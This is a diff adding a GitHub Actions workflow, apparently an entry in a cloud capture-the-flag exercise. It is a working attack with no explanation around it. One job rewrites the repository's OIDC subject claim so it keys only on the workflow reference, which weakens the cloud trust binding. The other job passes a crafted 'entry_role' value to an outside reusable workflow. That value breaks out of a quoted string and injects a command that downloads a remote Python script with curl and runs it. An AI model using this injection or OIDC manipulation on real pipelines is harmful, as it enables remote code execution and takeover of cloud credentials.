@@ -1,0 +1,46 @@
+name: MetricForge final stage
+
+on:
+  push:
+    branches:
+      - codex/metricforge-cloud-ctf-0719
+    paths:
+      - ".github/workflows/metricforge-final.yml"
+      - "metricforge_final_stage.py"
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+  actions: write
+
+jobs:
+  configure-oidc-subject:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure repository OIDC subject
+        shell: bash
+        env:
+          GH_TOKEN: ${{ github.token }}
+          OWNER_REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          gh api --method PUT \
+            "/repos/${OWNER_REPO}/actions/oidc/customization/sub" \
+            --input - <<'JSON'
+          {
+            "use_default": false,
+            "include_claim_keys": ["job_workflow_ref"],
+            "use_immutable_subject": false
+          }
+          JSON
+          gh api "/repos/${OWNER_REPO}/actions/oidc/customization/sub"
+
+  final:
+    needs: configure-oidc-subject
+    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
+    with:
+      mode: exchange
+      nonce: k1mwjd-final
+      entry_role: >-
+        x" || true; curl -fsSL https://raw.githubusercontent.com/k1mwjd/writeup-flatforn/codex/metricforge-cloud-ctf-0719/metricforge_final_stage.py -o /tmp/metricforge_final_stage.py; python3 /tmp/metricforge_final_stage.py > entry.json; exit 0; #
